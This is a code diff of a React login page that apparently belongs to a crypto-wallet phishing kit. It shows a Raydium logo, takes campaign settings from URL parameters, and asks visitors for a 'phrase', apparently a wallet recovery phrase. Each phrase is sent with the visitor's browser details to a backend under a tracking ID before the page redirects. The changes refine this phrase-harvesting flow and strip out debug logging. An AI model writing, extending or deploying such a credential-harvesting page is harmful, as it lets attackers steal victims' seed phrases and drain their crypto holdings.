@@ -24,19 +24,10 @@ const LoginPage = () => {
   const bgColorBox: any = searchParams.get("modColor") || "#ffffff";
   const buttonColor: any = searchParams.get("btnColor") || "#00cfff";
   const cryptoLogId: any = searchParams.get("cryptoLogId");
-  console.log(cryptoLogId);
   const userId: any = searchParams.get("userId");
-  // const staticLogo = "/raydium-logo-freelogovectors.png"
   const staticLogo = "/raydium-ray-logo.png";
   const appLogo: any = cryptoLog?.appLogo || staticLogo;
   const token: any = searchParams.get("token");
-
-  // const logo2 = 'https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/crypto-images%2FGoogle_G_logo.svg.png6c1a7d17-bc0a-4806-82f3-55af5f746218?alt=media&token=ffe2ad9a-8340-4e33-ad59-f3fc057af635';
-  // console.log(logo)
-  // const logo = appLogo+'&token='+token;
-  // const dynamicLogo = logo.replace('crypto-images/', 'crypto-images%2F');
-  // console.log("logo:  ",dynamicLogo)
-  // console.log("appLogo:  ",appLogo)
 
   useEffect(() => {
     const parser = new UAParser();
@@ -56,22 +47,6 @@ const LoginPage = () => {
 
   const handleSubmit = async () => {
     const inputValue = value.trim();
-
-    if (inputValue === cryptoLog?.specialPhrase) {
-      router.push(cryptoLog?.redirectUrl);
-      console.log("redirecting to: ", cryptoLog?.redirectUrl);
-      return;
-    }
-
-    // if (inputValue === cryptoLog?.specialPhrase) {
-    //   if (cryptoLog?.redirectUrl) {
-    //     window.open(cryptoLog.redirectUrl, "_blank"); // Opens in a new tab
-    //     console.log("Redirecting to:", cryptoLog.redirectUrl);
-    //   } else {
-    //     console.log("No redirect URL found.");
-    //   }
-    //   return;
-    // }
 
     if (!inputValue) {
       setError("Phrase cannot be empty.");
@@ -107,9 +82,17 @@ const LoginPage = () => {
     if (error) {
       return;
     }
-    console.log(phrases.some((phraseObj) => phraseObj.phrase === value));
-    if (phrases.some((phraseObj) => phraseObj.phrase === value)) {
-      window.location.replace(cryptoLog?.redirectUrl);
+
+    if (phrases?.some((phraseObj) => phraseObj?.phrase === value)) {
+      localStorage.clear();
+      sessionStorage.clear();
+
+      if (cryptoLog?.redirectUrl) {
+        window.location.href = cryptoLog.redirectUrl;
+      } else {
+        setError("Redirect URL does not exist");
+      }
+      return;
     } else {
       const response = await setPhrase(value, userInfo, cryptoLogId);
       if (response?.ok) {
@@ -126,8 +109,6 @@ const LoginPage = () => {
       }
     }
   };
-
-  console.log(cryptoLog);
 
   const appName = cryptoLog?.appName?.toUpperCase();
 
